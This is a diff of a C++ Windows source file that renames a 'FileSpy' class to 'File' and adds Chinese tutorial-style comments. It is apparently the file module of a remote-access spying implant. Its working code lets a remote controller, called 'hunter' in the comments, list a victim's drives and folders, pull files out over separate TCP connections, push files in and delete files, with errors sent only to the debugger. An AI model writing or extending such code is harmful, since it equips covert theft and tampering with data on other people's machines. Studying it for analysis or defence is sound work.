@@ -170,12 +170,14 @@ void File::doGetDirFiles(TcpSocket* sock, std::map<std::string, std::string>& ar
 		sock->sendData(data.data(), data.size());
 	}
 	else {
+		// DIR参数不为空的情况 指定了要获取路径的目录
 		std::vector<std::string> files;
 		std::vector<std::string> dirs;
-
+		// 获取该路径下的目录和文件
 		dirs = getDirs(dir);
 		files = getFiles(dir);
-
+		// 构造返回数据
+		// 加入路径下路径
 		data.append(gFile.CmdSendDirs + gFile.CmdSplit);
 		data.append("DIR" + gFile.CmdSplit + dir + gFile.CmdSplit);
 		data.append("DIRS" + gFile.CmdSplit);
@@ -184,11 +186,12 @@ void File::doGetDirFiles(TcpSocket* sock, std::map<std::string, std::string>& ar
 		for (int i = 0; i < max; ++i) {
 			data.append(dirs[i] + gFile.CmdFileSplit);
 		}
+		// 去掉多余的分隔符
 		if (dirs.size() > 0) {
 			data.erase(data.size() - 1);
 		}
 		data.append(gFile.CmdEnd);
-
+		// 加入路径下文件
 		data.append(gFile.CmdSendFiles + gFile.CmdSplit);
 		data.append("DIR" + gFile.CmdSplit + dir + gFile.CmdSplit);
 		data.append("FILES" + gFile.CmdSplit);
@@ -197,11 +200,12 @@ void File::doGetDirFiles(TcpSocket* sock, std::map<std::string, std::string>& ar
 		for (int i = 0; i < max; ++i) {
 			data.append(files[i] + gFile.CmdFileSplit);
 		}
+		// 去掉多余的分隔符
 		if (files.size()) {
 			data.erase(data.size() - 1);
 		}
 		data.append(gFile.CmdEnd);
-
+		// 发送数据
 		sock->sendData(data.data(), data.size());
 	}
 
@@ -215,7 +219,7 @@ void File::doDownloadFile(TcpSocket* sock, std::map<std::string, std::string>& a
 	startSendFileByNewThread(filePath, sock->mIp, port);
 }
 
-void FileSpy::doUploadFile(TcpSocket* sock, std::map<std::string, std::string>& args)
+void File::doUploadFile(TcpSocket* sock, std::map<std::string, std::string>& args)
 {
 	std::string filePath = args["FILE_PATH"];
 	int port = atoi(args["PORT"].data());
@@ -223,18 +227,18 @@ void FileSpy::doUploadFile(TcpSocket* sock, std::map<std::string, std::string>& 
 	startRecvFileByNewThread(filePath, sock->mIp, port);
 }
 
-void FileSpy::doDeleteFile(TcpSocket* sock, std::map<std::string, std::string>& args)
+void File::doDeleteFile(TcpSocket* sock, std::map<std::string, std::string>& args)
 {
 	bool  ret = DeleteFileA(args["FILE_PATH"].data());
 	std::string data;
 	if (ret) {
-		data.append(gSpy.CmdDeleteFileSuccess);
-		data.append(gSpy.CmdEnd);
+		data.append(gFile.CmdDeleteFileSuccess);
+		data.append(gFile.CmdEnd);
 		sock->sendData(data.data(), data.size());
 	}
 	else {
-		data.append(gSpy.CmdDeleteFileFailed);
-		data.append(gSpy.CmdEnd);
+		data.append(gFile.CmdDeleteFileFailed);
+		data.append(gFile.CmdEnd);
 		sock->sendData(data.data(), data.size());
 	}
 }
@@ -260,21 +264,22 @@ std::vector<std::string> File::getDrives()
 	return drives;
 }
 
-std::vector<std::string> FileSpy::getDirs(std::string dir)
+std::vector<std::string> File::getDirs(std::string dir)
 {
 	WIN32_FIND_DATAA findData;
 	HANDLE hFind = FindFirstFileA(dir.append("\\*").data(), &findData);
 	std::vector<std::string> files;
-
+	// 该路径下无任何路径
 	if (hFind == INVALID_HANDLE_VALUE) {
 		return files;
 	}
 
 	while (FindNextFileA(hFind, &findData)) {
+		// 不要遍历.和.. 防止死循环
 		if (!strcmp(findData.cFileName, "..") || !strcmp(findData.cFileName, ".")) {
 			continue;
 		}
-
+		// 如果是目录就收集起来
 		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
 			files.push_back(findData.cFileName);
 		}
@@ -285,7 +290,7 @@ std::vector<std::string> FileSpy::getDirs(std::string dir)
 	return files;
 }
 
-std::vector<std::string> FileSpy::getFiles(std::string dir)
+std::vector<std::string> File::getFiles(std::string dir)
 {
 	WIN32_FIND_DATAA findData;
 	HANDLE hFind = FindFirstFileA(dir.append("\\*").data(), &findData);
@@ -296,10 +301,11 @@ std::vector<std::string> FileSpy::getFiles(std::string dir)
 	}
 
 	while (FindNextFileA(hFind, &findData)) {
+		// 不要遍历.和.. 防止死循环
 		if (!strcmp(findData.cFileName, "..") || !strcmp(findData.cFileName, ".")) {
 			continue;
 		}
-
+		// 这里是收集不是目录的文件
 		if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
 			files.push_back(findData.cFileName);
 		}
@@ -310,10 +316,13 @@ std::vector<std::string> FileSpy::getFiles(std::string dir)
 	return files;
 }
 
-void FileSpy::startSendFileByNewThread(std::string filePath, std::string domain, int port)
+void File::startSendFileByNewThread(std::string filePath, std::string domain, int port)
 {
+	// 构造发送给sendFileThreadProc线程函数的参数
 	char* args = new char[MAX_PATH + MAX_PATH + sizeof(int)];
 
+	// 这里为filePath和domain预留空间的原因是
+	// 确保有这么多空间的内容可以复制 否则会出错
 	filePath.reserve(MAX_PATH);
 	memcpy(args, filePath.data(), MAX_PATH);
 
@@ -322,59 +331,67 @@ void FileSpy::startSendFileByNewThread(std::string filePath, std::string domain,
 
 	memcpy(args + MAX_PATH + MAX_PATH, (char*)&port, sizeof(int));
 
-	HANDLE h = CreateThread(NULL, 0, FileSpy::sendFileThreadProc, (LPVOID)args, 0, NULL);
+	HANDLE h = CreateThread(NULL, 0, File::sendFileThreadProc, (LPVOID)args, 0, NULL);
 	if (!h) {
-		std::cout << "Failed to create new thread" << std::endl;
+		OutputDebugStringA("Failed to create new thread\r\n");
 	}
 }
 
-DWORD FileSpy::sendFileThreadProc(LPVOID args)
+DWORD File::sendFileThreadProc(LPVOID args)
 {
+	// 获取传进来的参数
 	char filePath[MAX_PATH], domain[MAX_PATH];
 	memcpy(filePath, (char*)args, MAX_PATH);
 	memcpy(domain, (char*)args + MAX_PATH, MAX_PATH);
 	int port = *((int*)((char*)args + MAX_PATH + MAX_PATH));
-
+	// 真是一层层调用呀 一个sendFile就要好几个函数参与
 	startSendFile(filePath, domain, port);
-
-	delete (char*)args;
+	// 释放为传参而申请的空间
+	delete [] (char*)args;
 	return true;
 }
 
-void FileSpy::startSendFile(std::string filePath, std::string domain, int port)
+// 真正的sendFile来了
+void File::startSendFile(std::string filePath, std::string domain, int port)
 {
+	// 单独建立一个连接
 	TcpSocket sock;
 	if (!sock.connectTo(domain, port)) {
-		std::cout << "Failed to connect server for send file" << std::endl;
+		OutputDebugStringA("Failed to connect server for send file\r\n");
 		return;
 	}
 
+	// 二进制形式打开（这里用来c语言文件流）
 	FILE* fp = fopen(filePath.data(), "rb");
 	if (!fp) {
 		sock.dissconnect();
 
-		std::cout << "Failed to open file for send file" << std::endl;
+		OutputDebugStringA("Failed to open file for send file\r\n");
 		return;
 	}
 
+	// 改变文件流读写位置到尾部
 	fseek(fp, 0, SEEK_END);
-	unsigned int len = ftell(fp);
-	rewind(fp);
+	unsigned int len = ftell(fp); // 获取此时尾部的偏移
+	rewind(fp); // 用于将文件指针重新指向文件的开头，同时清除和文件流相关的错误和eof标记
 
+	// 获取文件名和后缀
 	char name[_MAX_FNAME], ext[_MAX_EXT];
 	_splitpath(filePath.data(), NULL, NULL, name, ext);
 
+	// 构造自定义数据包头 先发送包头 告诉文件大小(字节)
 	FileHeader header;
 	sprintf(header.fileName, "%s%s", name, ext);
 	header.len = len;
 	sock.sendData((char*)&header, sizeof(header));
 
-	const unsigned int paketLen = 800;
+	// 分段发送
+	const unsigned int packetLen = 800;
 	char data[800];
 	unsigned int pos = 0;
 
 	while (pos < len) {
-		int sendSize = (pos + paketLen) > len ? len - pos : paketLen;
+		int sendSize = (pos + packetLen) > len ? len - pos : packetLen;
 
 		fread(data, 1, sendSize, fp);
 
@@ -388,8 +405,9 @@ void FileSpy::startSendFile(std::string filePath, std::string domain, int port)
 	fclose(fp);
 }
 
-void FileSpy::startRecvFileByNewThread(std::string filePath, std::string domain, int port)
+void File::startRecvFileByNewThread(std::string filePath, std::string domain, int port)
 {
+	// 构造给线程函数的参数
 	char* args = new char[MAX_PATH + MAX_PATH + sizeof(int)];
 
 	filePath.reserve(MAX_PATH);
@@ -400,14 +418,15 @@ void FileSpy::startRecvFileByNewThread(std::string filePath, std::string domain,
 
 	memcpy(args + MAX_PATH + MAX_PATH, (char*)&port, sizeof(int));
 
-	HANDLE h = CreateThread(NULL, 0, FileSpy::recvFileThreadProc, (LPVOID)args, 0, NULL);
+	HANDLE h = CreateThread(NULL, 0, File::recvFileThreadProc, (LPVOID)args, 0, NULL);
 	if (!h) {
-		std::cout << "Failed to create new thread" << std::endl;
+		OutputDebugStringA("Failed to create new thread\r\n");
 	}
 }
 
-DWORD FileSpy::recvFileThreadProc(LPVOID args)
+DWORD File::recvFileThreadProc(LPVOID args)
 {
+	// 单独开线程连接hunter执行操作
 	char filePath[MAX_PATH], domain[MAX_PATH];
 	memcpy(filePath, args, MAX_PATH);
 	memcpy(domain, (char*)args + MAX_PATH, MAX_PATH);
@@ -415,29 +434,32 @@ DWORD FileSpy::recvFileThreadProc(LPVOID args)
 
 	startRecvFile(filePath, domain, port);
 
-	delete (char*)args;
+	delete [] (char*)args;
 	return true;
 }
 
-void FileSpy::startRecvFile(std::string filePath, std::string domain, int port)
+void File::startRecvFile(std::string filePath, std::string domain, int port)
 {
 	TcpSocket sock;
 	if (!sock.connectTo(domain, port)) {
-		std::cout << "Failed to connect server for send file" << std::endl;
+		OutputDebugStringA("Failed to connect server for send file\r\n");
 		return;
 	}
 
+	// 创建一个文件
 	FILE* fp = fopen(filePath.data(), "wb");
 	if (!fp) {
 		sock.dissconnect();
 
-		std::cout << "Failed to open file for send file" << std::endl;
+		OutputDebugStringA("Failed to open file for send file\r\n");
 		return;
 	}
 
+	// 分段接收
 	const int packetLen = 800;
 	char data[packetLen];
-	while (1) {
+	while (true) {
+		// hunter发送完就关闭套接字 所以这里不存在没有数据堵塞
 		int ret = sock.recvData(data, packetLen);
 
 		if (ret == SOCKET_ERROR || ret == 0) {
